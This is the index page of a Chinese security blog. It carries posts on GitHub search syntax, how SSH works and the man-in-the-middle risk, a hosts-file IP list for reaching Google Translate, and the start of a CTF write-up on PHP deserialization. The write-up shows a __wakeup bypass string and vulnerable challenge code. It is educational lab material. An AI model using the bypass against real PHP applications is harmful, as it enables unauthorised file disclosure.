<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Jokak_blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="欢迎来到Jokak的博客哦,希望一起进步呀(￣y▽,￣)╭">
<meta property="og:type" content="website">
<meta property="og:title" content="Jokak_blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Jokak_blog">
<meta property="og:description" content="欢迎来到Jokak的博客哦,希望一起进步呀(￣y▽,￣)╭">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Jokak Doe">
<meta property="article:tag" content="网络安全">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Jokak_blog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Jokak_blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-Github搜索技巧" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/04/18/Github%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/" class="article-date">
  <time class="dt-published" datetime="2023-04-18T11:39:22.000Z" itemprop="datePublished">2023-04-18</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF-web-writeup/">CTF_web_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/04/18/Github%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/">Github搜索技巧</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>近日，GitHub推出了全新的查询语法 ，类似于fofa，shodan，zoomeye这些搜索引擎</p>
<p>官方语法如下：</p>
<h2 id="基本搜索"><a href="#基本搜索" class="headerlink" title="基本搜索"></a><strong>基本搜索</strong></h2><table>
<thead>
<tr>
<th><strong>语法例子</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>cat stars:&gt;100</td>
<td>查找拥有100颗以上收藏的包含”猫”存储库</td>
</tr>
<tr>
<td>user:defunkt</td>
<td>获取用户defunkt的所有存储库</td>
</tr>
<tr>
<td>tom location:”San Francisco, CA”</td>
<td>查找所有位于“San Francisco, CA”的tom用户</td>
</tr>
<tr>
<td>join extension:coffee</td>
<td>查找所有在代码中使用coffee扩展的join实例</td>
</tr>
<tr>
<td>NOT cat</td>
<td>排除所有包含cat的结果</td>
</tr>
</tbody></table>
<h2 id="存储库搜索"><a href="#存储库搜索" class="headerlink" title="存储库搜索"></a><strong>存储库搜索</strong></h2><p>存储库搜索会浏览在GitHub上有权访问的项目(。你也可以筛选结果</p>
<table>
<thead>
<tr>
<th><strong>语法例子</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>cat stars:&gt;100</td>
<td>查找拥有100颗以上收藏的包含”猫”存储库</td>
</tr>
<tr>
<td>user:defunkt</td>
<td>获取用户defunkt的所有存储库</td>
</tr>
<tr>
<td>pugs pushed:&gt;2013-01-28</td>
<td>查找自2013年1月28日以来推送的Pugs存储库</td>
</tr>
<tr>
<td>node.js forks:&lt;200</td>
<td>查找所有拥有少于200个分支的node.js存储库</td>
</tr>
<tr>
<td>jquery size:1024..4089</td>
<td>查找大小在1024和4089kb之间的jquery存储库</td>
</tr>
<tr>
<td>gitx fork:true</td>
<td>存储库搜索包括gitx的分支</td>
</tr>
<tr>
<td>gitx fork:only</td>
<td>存储库搜索仅返回gitx的分支</td>
</tr>
</tbody></table>
<h2 id="代码搜索"><a href="#代码搜索" class="headerlink" title="代码搜索"></a><strong>代码搜索</strong></h2><p>代码搜索会浏览托管在GitHub上的文件</p>
<table>
<thead>
<tr>
<th><strong>语法例子</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>install repo:charles&#x2F;privaterepo</td>
<td>在charles&#x2F;privaterepo存储库中的代码中查找所有install的实例。</td>
</tr>
<tr>
<td>shogun user:heroku</td>
<td>查找所有公共heroku存储库中与shogun相关的引用</td>
</tr>
<tr>
<td>join extension:coffee</td>
<td>查找所有扩展名为coffee的代码中join的实例</td>
</tr>
<tr>
<td>system size:&gt;1000</td>
<td>查找文件大小大于1000kbs的代码中所有system的实例</td>
</tr>
<tr>
<td>examples path:&#x2F;docs&#x2F;</td>
<td>在&#x2F;docs&#x2F;路径中查找所有示例</td>
</tr>
<tr>
<td>replace fork:true</td>
<td>在分支的源代码中搜索replace</td>
</tr>
</tbody></table>
<h2 id="问题搜索"><a href="#问题搜索" class="headerlink" title="问题搜索"></a><strong>问题搜索</strong></h2><p>问题搜索可以查看 GitHub 上的问题和拉取请求</p>
<table>
<thead>
<tr>
<th><strong>语法例子</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>encoding user:heroku</td>
<td>Heroku组织中的encoding问题</td>
</tr>
<tr>
<td>cat is:open</td>
<td>查找cat的opne问题</td>
</tr>
<tr>
<td>strange comments:&gt;42</td>
<td>有超过 42 条评论的问题</td>
</tr>
<tr>
<td>hard label:bug</td>
<td>标记为 bug 的困难问题</td>
</tr>
<tr>
<td>author:mojombo</td>
<td>所有由 mojombo 编写的问题</td>
</tr>
<tr>
<td>mentions:tpope</td>
<td>提到 tpope 的所有问题</td>
</tr>
<tr>
<td>assignee:rtomayko</td>
<td>所有分配给 rtomayko 的问题</td>
</tr>
<tr>
<td>exception created:&gt;2012-12-31</td>
<td>自 2013 年初以来异常问题</td>
</tr>
<tr>
<td>exception updated:&lt;2013-01-01</td>
<td>在 2013 年之前的异常问题</td>
</tr>
</tbody></table>
<h2 id="用户搜索"><a href="#用户搜索" class="headerlink" title="用户搜索"></a><strong>用户搜索</strong></h2><p>用户搜索是指在GitHub上查找具有账户的用户</p>
<table>
<thead>
<tr>
<th><strong>语法例子</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>fullname:”凌风子虚”</td>
<td>查找全名为”凌风子虚”的用户</td>
</tr>
<tr>
<td>tom location:”San Francisco, CA”</td>
<td>查找在”San Francisco, CA”的所有tom用户</td>
</tr>
<tr>
<td>chris followers:100..200</td>
<td>查找其粉丝数在100到200之间的所有chris用户</td>
</tr>
<tr>
<td>ryan repos:&gt;10</td>
<td>查找其仓库数量超过10个的所有ryan用户</td>
</tr>
</tbody></table>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/04/18/Github%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/" data-id="clgm7pogp0000eov49dat4wsn" data-title="Github搜索技巧" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-ssh原理及使用" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/03/19/ssh%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BD%BF%E7%94%A8/" class="article-date">
  <time class="dt-published" datetime="2023-03-19T03:52:39.000Z" itemprop="datePublished">2023-03-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF-web-writeup/">CTF_web_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/03/19/ssh%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BD%BF%E7%94%A8/">ssh原理及使用</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="SSH简介"><a href="#SSH简介" class="headerlink" title="SSH简介"></a>SSH简介</h2><p><strong>安全外壳协议</strong>（Secure Shell Protocol，简称SSH）是一种建立在应用层基础上的<strong>加密的</strong>网络传输<strong>协议</strong>，主要用来在客户端和服务器之间建立安全通信隧道。使用SSH进行远程登录，信息传输是加密的，即使信息被中途截获也不会泄露。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注：</span><br><span class="line">* SSH仅仅是一个协议标准，其具体的实现有很多，既有开源实现的OpenSSH，也有商业实现方案。使用范围最广泛的当然是开源实现OpenSSH。</span><br></pre></td></tr></table></figure>



<h2 id="Linux下安装SSH-Server"><a href="#Linux下安装SSH-Server" class="headerlink" title="Linux下安装SSH Server"></a>Linux下安装SSH Server</h2><p>使用SSH时，被登录的主机需要安装并运行SSH Server。SSH实现有很多种，比如在Linux中可以用 OpenSSH：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl status ssh # 可以查看系统是否有ssh server可用</span><br><span class="line">sudo apt-get install openssh-server #安装openssh</span><br><span class="line">sudo systemctl enable ssh</span><br><span class="line">sudo systemctl start ssh</span><br></pre></td></tr></table></figure>



<h2 id="数据加密方式"><a href="#数据加密方式" class="headerlink" title="数据加密方式"></a>数据加密方式</h2><p>对数据进行加密的方式主要有两种：对称加密（密钥加密）和非对称加密（公钥加密）。</p>
<p>对称加密指加密解密使用的是同一套秘钥。Client端把密钥加密后发送给Server端，Server用同一套密钥解密。对称加密的加密强度比较高，很难破解。但是，Client数量庞大，很难保证密钥不泄漏。如果有一个Client端的密钥泄漏，那么整个系统的安全性就存在严重的漏洞。为了解决对称加密的漏洞，于是就产生了非对称加密。非对称加密有两个密钥：“公钥”和“私钥”。<strong>公钥加密后的密文，只能通过对应的私钥进行解密。想从公钥推理出私钥几乎不可能</strong>，所以非对称加密的安全性比较高。</p>
<p>SSH的加密原理中，使用了RSA非对称加密算法。</p>
<h1 id="SSH工作原理"><a href="#SSH工作原理" class="headerlink" title="SSH工作原理"></a>SSH工作原理</h1><p>SSH 协议是基于客户端-服务器模型的，其工作过程如下：</p>
<ol>
<li><p>客户端发起连接请求：首先，用户需要启动一个 SSH 客户端程序，并向服务器发起 SSH 连接请求。连接请求包含服务器的 IP 地址和用户的登录凭据（用户名和密码或 SSH 密钥）。</p>
</li>
<li><p>服务器响应连接请求：一旦服务器收到连接请求，它会检查用户提供的登录凭据。如果凭据验证成功，服务器就会向客户端发送加密的连接确认信息。</p>
</li>
<li><p>客户端和服务器建立加密连接：在收到连接确认信息后，客户端会生成一个随机的会话密钥，用于加密通信。然后，客户端会向服务器发送一个加密的请求，包含会话密钥和其他的连接信息。</p>
</li>
<li><p>SSH 会话开始：一旦客户端和服务器成功建立加密连接，SSH 会话就开始了。在会话期间，客户端可以向服务器发送各种命令和数据，并接收服务器的响应。所有的通信都经过密钥加密，以确保数据安全。</p>
</li>
<li><p>SSH 会话结束：当用户关闭 SSH 客户端程序时，SSH 会话就会结束。客户端程序会清除会话密钥和其他的临时数据，以确保不会有敏感信息留存在客户端。</p>
</li>
</ol>
<p><img src="https://pic2.zhimg.com/80/v2-46e7c27669cd6de13c1373e714ca407d_1440w.webp" alt="img"></p>
<h2 id="远程登录模型"><a href="#远程登录模型" class="headerlink" title="远程登录模型"></a>远程登录模型</h2><p>ssh安全验证原理，简单来说就是SSH Server会有一对密钥，公有密钥(PubKey)和私有密钥(PriKey)。当客户端用户请求连接服务器的ssh时，服务器会把公有密钥作为回应发送给请求连接的用户，私有密钥只在本地保管。然后客户端拿到公有密钥后用其加密目标用户的密码发送给服务器，服务器完成验证后建立连接。</p>
<p>客户端需发送以下命令并输入用户user123的密码即可：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh user123@server</span><br></pre></td></tr></table></figure>



<p>大致过程如下图所示：</p>
<p><img src="https://pic2.zhimg.com/80/v2-46e7c27669cd6de13c1373e714ca407d_1440w.webp" alt="img"></p>
<p>整个过程是这样的：<br>（1）远程主机收到用户的登录请求，把自己的公钥发给用户。<br>（2）用户使用这个公钥，将登录密码加密后，发送回来。<br>（3）远程主机用自己的私钥，解密登录密码，如果密码正确，就同意用户登录。</p>
<h2 id="口令登录"><a href="#口令登录" class="headerlink" title="口令登录"></a>口令登录</h2><p>客户端输入以下命令，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh user123@192.168.254.128</span><br></pre></td></tr></table></figure>



<p>如果是客户端第一次连接服务器，那么在执行上述命令后，客户端会显示   </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">The authenticity of host &#x27;192.168.254.128 (192.168.254.128)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:TRtIeYojTIb5o/2C2k8VRN7HrQ3xA8NioVO4H418ykM.</span><br><span class="line">This key is not known by any other names</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])?</span><br></pre></td></tr></table></figure>



<p>并且在输入 yes 之后，经过比对后，如果用户接受这个远程主机的公钥，系统会出现一句提示语：     <strong>Warning: Permanently added ‘192.168.254.128’ (ED25519) to the list of known hosts.</strong></p>
<p>输入 yes 之后，就能连接到远程服务器了。</p>
<h2 id="公钥登录"><a href="#公钥登录" class="headerlink" title="公钥登录"></a>公钥登录</h2><p>使用密码登录，每次都必须输入密码，非常麻烦。好在SSH还提供了公钥登录，可以省去输入密码的步骤。</p>
<p>所谓”公钥登录”，就是用户将自己的公钥储存在远程主机上。登录的时候，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来。远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录shell，不再要求输入密码。</p>
<p>这种方法要求用户必须提供自己的公钥。如果没有现成的，可以直接用ssh-keygen生成一个：</p>
<p>$ssh-keygen</p>
<h2 id="演示口令登录"><a href="#演示口令登录" class="headerlink" title="演示口令登录"></a>演示口令登录</h2><h2 id="演示公钥登录"><a href="#演示公钥登录" class="headerlink" title="演示公钥登录"></a>演示公钥登录</h2><h2 id="安全性问题："><a href="#安全性问题：" class="headerlink" title="安全性问题："></a>安全性问题：</h2><p> <strong>中间人攻击”（Man-in-the-middle attack）</strong></p>
<p>SSH之所以能够保证安全，原因在于它采用了公钥加密，这个过程本身是安全的，但是实际用的时候存在一个风险：</p>
<p>如果攻击者插在用户与远程主机之间（比如在公共的wifi区域），用伪造的公钥，获取用户的加密登录密码，再用自己的私钥解密成明文，用这个密码登录远程主机，那么SSH的安全机制就不存在了。</p>
<p>如图：</p>
<p> <img src="https://pic2.zhimg.com/80/v2-46e7c27669cd6de13c1373e714ca407d_1440w.webp" alt="img"></p>
<h2 id="ssh针对中间人攻击的解决方法："><a href="#ssh针对中间人攻击的解决方法：" class="headerlink" title="ssh针对中间人攻击的解决方法："></a>ssh针对中间人攻击的解决方法：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 私有密钥是只有server才有的，也就是即使中间有人截获了步骤3中client发送的带有password信息的包，也没有办法破解得知user123的密码。</span><br><span class="line">  </span><br><span class="line"> * 但是有可能有攻击者可以截获步骤1 client发送的请求包，从而伪装成 server发送自己的PubKey_attacker，然后 client 再向其发送自己用PubKey_attacker加密的password，就会被攻击者用PriKey_attacker 解密，从而得到password明文密码。所以一般要求用户在收到PubKey 时自行对比验证发送该公有密钥的主机是已知的安全主机。这就是为什么我们会看到     Are you sure you want to continue connecting (yes/no)?。 信任的主机一般都保存在$HOME/.ssh/known_hosts文件中。</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/03/19/ssh%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BD%BF%E7%94%A8/" data-id="clff73fkr0000wsv4hq7p31ws" data-title="ssh原理及使用" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-复活Google翻译" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/11/21/%E5%A4%8D%E6%B4%BBGoogle%E7%BF%BB%E8%AF%91/" class="article-date">
  <time class="dt-published" datetime="2022-11-21T09:59:52.000Z" itemprop="datePublished">2022-11-21</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/11/21/%E5%A4%8D%E6%B4%BBGoogle%E7%BF%BB%E8%AF%91/">复活Google翻译</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>近期发现我<strong>Google浏览器</strong>的Google翻译无法使用了（经常的毛病），于是就试着找下Google翻译一些可用IP，然后将这些IP添加到hosts文件中，Google翻译就完美复活了。妈妈再也不用担心Google翻译I无法使用啦（这么多IP，Google翻译稳定性将会大大滴提高🥳🥳）♪(´▽｀)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注：什么是hosts文件</span><br><span class="line"></span><br><span class="line">hosts是一个没有扩展名的系统文件，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址并打开对应网页；如果没有找到则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。</span><br></pre></td></tr></table></figure>



<p>下面看下具体过程叭（<strong>复活的是Google浏览器中的Google翻译，没有测试edge</strong>）</p>
<p>首先找到并用记事本打开Windows下hosts文件，位置是“<strong>C:\Windows\System32\drivers\etc</strong>”。</p>
<p><img src="/2022/11/21/%E5%A4%8D%E6%B4%BBGoogle%E7%BF%BB%E8%AF%91/image-20221121180954742.png"></p>
<p>然后将下面的IP 域名一起复制下，并在hosts文件中找个位置粘贴下来</p>
<p><img src="/2022/11/21/%E5%A4%8D%E6%B4%BBGoogle%E7%BF%BB%E8%AF%91/image-20221121181312643.png"></p>
<p>最后按下<strong>crl键加s键</strong>保存下来就好了φ(*￣0￣)</p>
<p>注：有的小伙伴可能遇到hosts文件打不开等情况，建议去百度搜索下电脑给出的报错信息，然后按指示操作就好啦~</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">142.250.4.90 translate.googleapis.com</span><br><span class="line">172.253.114.90 translate.googleapis.com</span><br><span class="line">172.217.203.90 translate.googleapis.com</span><br><span class="line">172.253.112.90 translate.googleapis.com</span><br><span class="line">142.250.9.90 translate.googleapis.com</span><br><span class="line">172.253.116.90 translate.googleapis.com</span><br><span class="line">142.250.97.90 translate.googleapis.com</span><br><span class="line">142.250.30.90 translate.googleapis.com</span><br><span class="line">142.250.111.90 translate.googleapis.com</span><br><span class="line">172.217.215.90 translate.googleapis.com</span><br><span class="line">142.250.11.90 translate.googleapis.com</span><br><span class="line">142.251.9.90 translate.googleapis.com</span><br><span class="line">108.177.122.90 translate.googleapis.com</span><br><span class="line">142.250.96.90 translate.googleapis.com</span><br><span class="line">142.250.100.90 translate.googleapis.com</span><br><span class="line">142.250.110.90 translate.googleapis.com</span><br><span class="line">172.217.214.90 translate.googleapis.com</span><br><span class="line">172.217.222.90 translate.googleapis.com</span><br><span class="line">142.250.31.90 translate.googleapis.com</span><br><span class="line">142.250.126.90 translate.googleapis.com</span><br><span class="line">142.250.10.90 translate.googleapis.com</span><br><span class="line">172.217.195.90 translate.googleapis.com</span><br><span class="line">172.253.115.90 translate.googleapis.com</span><br><span class="line">142.251.5.90 translate.googleapis.com</span><br><span class="line">142.250.136.90 translate.googleapis.com</span><br><span class="line">142.250.12.90 translate.googleapis.com</span><br><span class="line">142.250.101.90 translate.googleapis.com</span><br><span class="line">172.217.192.90 translate.googleapis.com</span><br><span class="line">142.250.0.90 translate.googleapis.com</span><br><span class="line">142.250.107.90 translate.googleapis.com</span><br><span class="line">172.217.204.90 translate.googleapis.com</span><br><span class="line">142.250.28.90 translate.googleapis.com</span><br><span class="line">142.250.125.90 translate.googleapis.com</span><br><span class="line">172.253.124.90 translate.googleapis.com</span><br><span class="line">142.250.8.90 translate.googleapis.com</span><br><span class="line">142.250.128.90 translate.googleapis.com</span><br><span class="line">142.250.112.90 translate.googleapis.com</span><br><span class="line">142.250.27.90 translate.googleapis.com</span><br><span class="line">142.250.105.90 translate.googleapis.com</span><br><span class="line">172.253.126.90 translate.googleapis.com</span><br><span class="line">172.253.123.90 translate.googleapis.com</span><br><span class="line">172.253.122.90 translate.googleapis.com</span><br><span class="line">172.253.62.90 translate.googleapis.com</span><br><span class="line">142.250.98.90 translate.googleapis.com</span><br><span class="line">142.250.185.238 translate.googleapis.com</span><br><span class="line">142.251.116.101 translate.googleapis.com</span><br><span class="line">216.58.214.14 translate.googleapis.com</span><br><span class="line">142.250.189.206 translate.googleapis.com</span><br><span class="line">216.58.209.174 translate.googleapis.com</span><br><span class="line">142.250.203.142 translate.googleapis.com</span><br><span class="line">142.250.218.14 translate.googleapis.com</span><br><span class="line">142.251.10.138 translate.googleapis.com</span><br><span class="line">142.251.40.174 translate.googleapis.com</span><br><span class="line">142.250.185.174 translate.googleapis.com</span><br><span class="line">172.217.16.46 translate.googleapis.com</span><br><span class="line">172.217.0.46 translate.googleapis.com</span><br><span class="line">172.217.31.142 translate.googleapis.com</span><br><span class="line">216.58.220.142 translate.googleapis.com</span><br><span class="line">172.217.13.142 translate.googleapis.com</span><br><span class="line">142.250.110.90 translate.googleapis.com</span><br><span class="line">172.217.203.90 translate.googleapis.com</span><br><span class="line">172.253.112.90 translate.googleapis.com</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/11/21/%E5%A4%8D%E6%B4%BBGoogle%E7%BF%BB%E8%AF%91/" data-id="claqmby5c0000zgv47q2g7970" data-title="复活Google翻译" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-NSSCTF-SWPUCTF-ez-ez-unserialize" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/" class="article-date">
  <time class="dt-published" datetime="2022-10-20T10:00:30.000Z" itemprop="datePublished">2022-10-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF-web-writeup/">CTF_web_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/">由NSSCTF-SWPUCTF-ez_ez_unserialize，引发对反序列具体详细过程以及对__construct，__destruct函数执行情况深度分析</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>前置知识：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1，php中__FILE__是什么意思，</span><br><span class="line">php中__FILE__是一个魔术常量，它会返回当前执行PHP脚本的完整路径和文件名。自PHP 4.0.2版本起，它总是包含一个绝对路径。</span><br><span class="line"></span><br><span class="line">2,__wakeup()说明，</span><br><span class="line">unserialize()会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup() 方法</span><br><span class="line"></span><br><span class="line">3，__wakeup()魔术方法绕过，</span><br><span class="line">php版本为PHP5&lt;5.6.25，PHP7 &lt; 7.0.10时，只要序列化的中的成员数大于实际成员数，即可绕过该魔法函数，比如一个ctf的类序列化后是   </span><br><span class="line">O:3:&quot;ctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br><span class="line">把成员数&quot;1&quot;，改为&quot;2&quot;即可绕过，更改之后为</span><br><span class="line">O:3:&quot;ctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>进入靶场，发现是一个反序列化题目，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span> = <span class="keyword">__FILE__</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$x</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;x = <span class="variable">$x</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;x !== <span class="keyword">__FILE__</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;x = <span class="keyword">__FILE__</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;x);</span><br><span class="line">        <span class="comment">//flag is in fllllllag.php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;x&#x27;</span>])) &#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

